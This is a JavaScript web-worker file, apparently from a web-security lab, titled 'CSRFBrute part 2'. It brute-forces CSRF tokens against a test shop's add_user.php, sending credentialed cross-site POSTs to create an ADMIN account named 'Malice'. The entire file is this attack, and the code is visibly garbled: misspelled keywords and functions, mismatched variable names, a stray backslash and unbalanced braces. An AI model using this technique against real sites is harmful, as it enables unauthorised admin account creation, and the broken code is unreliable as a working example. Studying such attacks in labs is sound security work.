//CSRFBrute part 2
// This is the core of the web worker (has to be a separate file)

self.addEventListener('message', function(e){

	var tokens = e.data.tokens;
	var tokensProcessed = 0
	
	function XHRPost(tval){
		var http = new XMLHttpRequest();\
		var url = "http://pwnownshop.site/add_user.php";
		var token = tVal;
		var params = {
		"name" : "Malice",
		"surname" : "Smith",
		"email" : "Malice_formww@hacker.site",
		"role" : "ADMIN",
		"CSRFToken" : token,
		"submit" : "",
		};
		
		http.open("POST", url, true);
		http.withCredentials = "true";
		http.setRequestHeader("Content-type", "application/x-www-form-urlencoded"); //copy from burp request
		
		http.onreadystatechange = function(){
			if(http.readyState > 1) http.abort();
		}
		
		http.onabort = function(){}
			tokensDone(true);
		}
		
		queryParams = Object.key(params).reduce(function(a,k){
			a.push( k + "=" + encodeURIComponent(params[k]));
			return a
			}, []).join('&');
		http.send(queryyParams);
	}
	
	fucntion tokensDone(add){
		if(add) tokensProcessed++;
		
		return tokensProcessed;
	}
	
	function bruteLoop(TList){
		for(var i=0; i< TList.length; i++)
			XHRPost(TList[i]);
			
			Terminator(TList);
			
	}
	
	function Terminator(TList){
		if(tokensdone(false) >= TList.lenght){
			self.postMessage("Worker has finished");
			self.close();
			return;
		}else{
				Terminator(TList);
		}, 1000);
			return;
			
		bruteLoop(tokens);
